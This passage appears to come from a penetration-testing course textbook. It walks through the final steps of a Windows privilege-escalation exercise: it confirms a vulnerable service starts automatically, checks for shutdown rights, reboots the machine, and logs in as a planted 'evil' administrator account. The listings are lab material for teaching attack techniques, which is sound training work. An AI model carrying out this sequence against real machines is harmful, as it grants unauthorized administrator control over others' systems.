machine. Let's check the start options of the Servio service with the help of the Windows Management Instrumentation Command-line.$^{531}$

```
```
C:\Users\student>wmic service where caption="Servii" get name, caption, state, startmode
Caption Name StartMode State
Servii Servii Auto Running
```
```

*Listing 570 - Showing the StartMode of the vulnerable service*

This service will automatically start after a reboot. Now, let's use the **whoami** command to determine if our current user has the rights to restart the system:

```
```
C:\Users\student>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name Description State
==== ===== ====== =======
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUnlockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SetTimeZonePrivilege Change the time zone Disabled
```
```

*Listing 571 - Checking for reboot privileges*

The listing above shows that our user has been granted shutdown privileges (**SeShutdownPrivilege**)$^{532}$ (among others) and therefore we should be able to initiate a system shutdown or reboot. Note that the *Disabled* state only indicates if the privilege is currently enabled for the running process. In our case, it means that **whoami** has not requested, and hence is not currently using, the *SeShutdownPrivilege* privilege.

If the *SeShutdownPrivilege* was not present, we would have to wait for the victim to manually start the service, which would be much less convenient for us.

Let's go ahead and reboot (*/r* in zero seconds (*/t 0*):

```
```
C:\Users\student\Desktop> shutdown /r /t 0
```
```

*Listing 572 - Rebooting the machine*

Now that the reboot is complete, we should be able to log in to the target machine using the username “evil” with a password of “Evilpass”. After that, we can confirm that the evil user is part of the local Administrators group with the **net localgroup** command.

```
```
C:\Users\evil> net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the computer/domain
Members
```
```

$^{531}$ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/mswsc/wmic

$^{532}$ (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants